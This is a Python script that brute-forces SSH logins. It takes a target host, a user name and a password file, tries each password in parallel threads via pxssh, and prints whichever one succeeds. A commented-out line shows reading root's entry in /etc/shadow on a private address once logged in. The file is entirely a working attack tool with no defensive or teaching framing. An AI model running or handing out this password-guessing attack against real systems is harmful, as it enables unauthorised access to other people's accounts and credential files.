#!/usr/bin/python3

from threading import *
from pexpect import pxssh
import time
import sys
import optparse


maxConnections = 5
global connconnection_lock
connection_lock = BoundedSemaphore(value = maxConnections)
global Found
Found = False
global Fails
Fails = 0


def send_command(s, cmd):
        s.sendline(cmd)
        s.prompt()
        for line in str(s.before, encoding = 'utf-8').split('\r\n'):
                print(line)

def connect(host, user, password, release):
        global Found
        global Fails

        try:
                s = pxssh.pxssh()
                s.login(host, user, password)
                print('[+] Password Found: ', password)
                Found = True
        except Exception as e:
                if 'read_nonblocking' in str(e):
                        Fails += 1
                        # time.sleep(5)
                        connect(host, user, password, False)
                elif 'synchronize with original prompt' in str(e):
                        # time.sleep(1)
                        connect(host, user, password, False)
        finally:
                if release:
                        connection_lock.release()

def main():
        parser = optparse.OptionParser('usage %prog -H <target host> ' +
                                       '-u <user> -F <password list>')
        parser.add_option('-H', dest = 'host', type = 'string',
                          help = 'specify target host')
        parser.add_option('-F', dest = 'pwdfile', type = 'string',
                          help = 'specify password file')
        parser.add_option('-u', dest = 'user', type = 'string',
                          help = 'specify the user')
        opts, args = parser.parse_args()
        host = opts.host
        pwdfile = opts.pwdfile
        user = opts.user

        if None in (host, pwdfile, user):
                print(parser.usage)
                sys.exit()

        fn = open(pwdfile)
        for line in fn.readlines():
                if Found:
                        print("[*] Exiting: Password Found")
                        sys.exit()
                if Fails > 5:
                        print("[!] Exiting: Too Many Socket Timeouts")
                        sys.exit()
                connection_lock.acquire()
                password = line.strip('\r').strip('\n')
                print("[-] Testing: ", password)
                # connect(host, user, password, True)
                # print('Wrong: ', line)
                t = Thread(target = connect, args = (host,
                                                     user,
                                                     password,
                                                     True))
                child = t.start()

if '__main__' == __name__:
        # s = connect('192.168.1.110', 'root', '123qwe')
        # send_command(s, 'grep root /etc/shadow')
        main()
